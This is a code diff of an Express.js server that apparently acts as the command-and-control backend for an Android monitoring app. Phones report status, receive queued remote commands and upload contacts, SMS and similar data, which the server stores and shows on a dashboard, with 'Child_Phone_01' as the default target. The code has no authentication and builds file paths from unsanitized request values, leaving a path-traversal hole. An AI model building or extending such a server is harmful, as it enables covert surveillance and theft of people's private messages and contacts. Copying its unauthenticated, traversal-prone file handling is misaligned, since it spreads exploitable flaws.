@@ -1,132 +1,150 @@
 const express = require('express');
-const bodyParser = require('body-parser');
 const fs = require('fs');
-const cors = require('cors');
 const path = require('path');
+const cors = require('cors');
+const bodyParser = require('body-parser');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// --- 📂 SETTING: Data Storage ---
-const UPLOADS_FOLDER = path.join(__dirname, 'uploads');
+// --- 1. SETTINGS ---
+// Data kahan save hoga?
+const UPLOADS_DIR = path.join(__dirname, 'uploads');
 
-if (!fs.existsSync(UPLOADS_FOLDER)) {
-    fs.mkdirSync(UPLOADS_FOLDER, { recursive: true });
-    console.log("✅ 'uploads' folder created!");
+// Agar folder nahi hai to bana lo
+if (!fs.existsSync(UPLOADS_DIR)) {
+    fs.mkdirSync(UPLOADS_DIR);
+    console.log("📂 'uploads' folder created successfully.");
 }
 
-app.use(cors());
-app.use(bodyParser.json({ limit: '50mb' }));
+// Middleware (Security & Data Size)
+app.use(cors()); // Allow connection from anywhere
+app.use(bodyParser.json({ limit: '50mb' })); // Allow big files (Photos/Contacts)
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
-app.use(express.static(__dirname));
+app.use(express.static(__dirname)); // Index.html ko dikhane ke liye
 
-// Memory Storage for Status & Commands
-let deviceState = {}; 
+// RAM Storage (Temporary Status Store)
+let devices = {}; 
 
-// ==========================================
-// 📲 ANDROID PHONE API (Critical Part)
-// ==========================================
+// ==================================================
+// 📲 PHONE SIDE (Android App yahan baat karega)
+// ==================================================
 
-// 1. Phone Status Update + Get Command (Ye sabse zaroori hai)
+// 1. Phone Status Update karega & Command Check karega
+// Ye sabse IMPORTANT part hai.
 app.post('/api/update-status', (req, res) => {
-    const { device_id, model, android_version, battery, ringerMode } = req.body;
+    const { device_id, model, battery, android_version, isCharging } = req.body;
+
+    // Default ID agar phone na bheje
+    const id = device_id || "Child_Phone_01";
+
+    // Status save karo
+    if (!devices[id]) devices[id] = {};
     
-    if (device_id) {
-        // Status Update karo
-        const currentCmd = deviceState[device_id]?.currentCommand || "none";
+    // Command check karo (Jo pending hai)
+    const pendingCommand = devices[id].command || "none";
 
-        deviceState[device_id] = {
-            model: model || "Unknown",
-            android_version: android_version || "--",
-            battery: battery || 0,
-            ringerMode: ringerMode || "normal",
-            lastSeen: Date.now(),
-            currentCommand: currentCmd // Command mat udao abhi
-        };
+    // Update Device State
+    devices[id] = {
+        model: model || "Unknown Mobile",
+        battery: battery || 0,
+        android_version: android_version || "--",
+        isCharging: isCharging || false,
+        lastSeen: Date.now(),
+        command: "none" // Command bhejne ke baad clear kar do
+    };
 
-        // ⚠️ FIX: App ko JSON mein Command wapas bhejo
-        // Agar command "none" nahi hai, to use bhejo aur clear kar do
-        let commandToSend = "none";
-        if (currentCmd !== "none") {
-            commandToSend = currentCmd;
-            console.log(`📤 Sending Command to Phone: ${commandToSend}`);
-            deviceState[device_id].currentCommand = "none"; // Clear after sending
-        }
+    console.log(`📡 Ping from ${id} | Battery: ${battery}% | Command Sent: ${pendingCommand}`);
 
-        res.json({ 
-            status: "success", 
-            command: commandToSend 
-        });
-
-    } else {
-        res.status(400).json({ error: "Device ID missing" });
-    }
+    // Phone ko Command wapas bhejo
+    res.json({
+        status: "success",
+        command: pendingCommand
+    });
 });
 
-// 2. Phone Data Upload Logic
+// 2. Phone Data Upload karega (Contacts, SMS, etc)
 app.post('/api/upload-data', (req, res) => {
     const { device_id, type, data } = req.body;
+    const id = device_id || "Child_Phone_01";
 
-    if (!device_id || !type || !data) {
-        return res.status(400).send("Bad Request");
-    }
+    console.log(`📥 Data Received from ${id}: [${type}]`);
 
-    console.log(`📥 Received Data from ${device_id}: ${type}`);
+    // File ka naam: Child_Phone_01_contacts.json
+    const fileName = `${id}_${type}.json`;
+    const filePath = path.join(UPLOADS_DIR, fileName);
 
-    const cleanType = type.toLowerCase();
-    const fileName = `${device_id}_${cleanType}.json`;
-    const filePath = path.join(UPLOADS_FOLDER, fileName);
-    
     try {
-        let finalData = data;
-        if (typeof data === 'string') {
-            try { finalData = JSON.parse(data); } catch(e) {}
-        }
-
-        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
-        console.log(`✅ Saved: ${fileName}`);
-        res.send("Success");
-    } catch (err) {
-        console.error("❌ Save Error:", err);
-        res.status(500).send("Error saving data");
+        // Data ko file mein save karo
+        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+        console.log(`✅ Saved to: ${fileName}`);
+        res.json({ status: "success", message: "Data Saved" });
+    } catch (error) {
+        console.error("❌ Save Error:", error);
+        res.status(500).json({ status: "error", message: "Save failed" });
     }
 });
 
-// ==========================================
-// 💻 DASHBOARD API (Website)
-// ==========================================
 
-// 1. Check Status
-app.get('/api/device-status/:deviceId', (req, res) => {
-    const state = deviceState[req.params.deviceId] || { isOnline: false };
-    const isOnline = state.lastSeen ? (Date.now() - state.lastSeen) < 60000 : false; 
-    res.json({ ...state, isOnline });
+// ==================================================
+// 💻 DASHBOARD SIDE (Tumhari Website yahan baat karegi)
+// ==================================================
+
+// 1. Website Status Check karegi
+app.get('/api/device-status/:id', (req, res) => {
+    const id = req.params.id;
+    const device = devices[id];
+
+    if (!device) {
+        // Agar phone abhi tak connect nahi hua
+        return res.json({ 
+            isOnline: false, 
+            battery: 0, 
+            model: "Waiting...",
+            message: "Device not connected yet"
+        });
+    }
+
+    // Agar 60 second se jyada ho gaye to Offline maano
+    const isOnline = (Date.now() - device.lastSeen) < 60000;
+
+    res.json({
+        ...device,
+        isOnline: isOnline
+    });
 });
 
-// 2. Send Command from Website
+// 2. Website se Command Bhejo
 app.post('/api/send-command', (req, res) => {
     const { device_id, command } = req.body;
-    if (!deviceState[device_id]) deviceState[device_id] = {};
+    const id = device_id || "Child_Phone_01";
+
+    if (!devices[id]) devices[id] = {};
+
+    // Command queue mein daal do
+    devices[id].command = command;
     
-    deviceState[device_id].currentCommand = command;
-    console.log(`🚀 Admin sent command: '${command}' to ${device_id}`);
-    res.json({ status: "success", message: "Command queued" });
+    console.log(`🚀 Admin sent command: [${command}] to ${id}`);
+    res.json({ status: "success", message: `Command '${command}' queued.` });
 });
 
-// 3. View Data (Contacts/SMS)
-app.get('/api/get-data/:deviceId/:type', (req, res) => {
-    const fileName = `${req.params.deviceId}_${req.params.type.toLowerCase()}.json`;
-    const filePath = path.join(UPLOADS_FOLDER, fileName);
+// 3. Website Data Mangegi (View Contacts/SMS)
+app.get('/api/get-data/:id/:type', (req, res) => {
+    const { id, type } = req.params;
+    const fileName = `${id}_${type}.json`;
+    const filePath = path.join(UPLOADS_DIR, fileName);
 
     if (fs.existsSync(filePath)) {
         res.sendFile(filePath);
     } else {
-        res.json([]);
+        res.json([]); // Empty list agar file nahi hai
     }
 });
 
-// Start Server
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 SERVER RUNNING on Port ${PORT}`);
-    console.log(`📂 Storage: ${UPLOADS_FOLDER}`);
+// --- Server Start ---
+app.listen(PORT, () => {
+    console.log(`=========================================`);
+    console.log(`🔥 SERVER STARTED ON PORT ${PORT}`);
+    console.log(`📂 Data Folder: ${UPLOADS_DIR}`);
+    console.log(`=========================================`);
 });
